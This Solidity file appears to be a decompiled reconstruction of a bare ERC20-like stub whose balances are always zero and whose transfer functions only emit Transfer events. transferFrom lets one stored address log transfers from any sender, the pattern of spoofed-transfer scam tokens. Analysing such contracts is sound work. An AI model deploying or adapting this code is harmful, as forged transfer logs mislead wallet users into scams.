// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

/// @notice High-level reconstruction of an extremely minimal ERC20-like stub.
/// Balances are always zero; transfers only emit events. Name/symbol values are
/// embedded constants in the original bytecode (unknown here, so left blank).
contract StubToken18 {
    // Immutable deployment-time storage values
    string private _signature;      // set in storage slot 1 at deployment
    address private _transferFrom;  // set in storage slot 0 at deployment

    event Transfer(address indexed from, address indexed to, uint256 value);

    // --- Metadata ---
    string private constant NAME = "";
    string private constant SYMBOL = "";
    uint8 public constant decimals = 18;

    function name() public pure returns (string memory) {
        return NAME;
    }

    function symbol() public pure returns (string memory) {
        return SYMBOL;
    }

    // Duplicates present in the bytecode
    function _name() external pure returns (string memory) {
        return NAME;
    }

    function _symbol() external pure returns (string memory) {
        return SYMBOL;
    }

    function _decimals() external pure returns (uint8) {
        return decimals;
    }

    // --- Supply ---

    uint256 public constant totalSupply = 0xe0483ef80ba16a5d7d95170;

    function _totalSupply() external pure returns (uint256) {
        return totalSupply;
    }

    // --- Views ---

    function balanceOf(address /*account*/) public pure returns (uint256) {
        return 0;
    }

    function signature() external view returns (string memory) {
        return _signature;
    }

    // --- Transfers ---

    function transfer(address recipient, uint256 amount) external returns (bool) {
        emit Transfer(tx.origin, recipient, amount);
        return true;
    }

    /// @dev Only succeeds if the transaction origin matches the stored `_transferFrom` address.
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        require(tx.origin == _transferFrom, "not authorized");
        emit Transfer(sender, recipient, amount);
        return true;
    }

    // --- Fallback ---

    fallback() external payable {
        revert();
    }
}
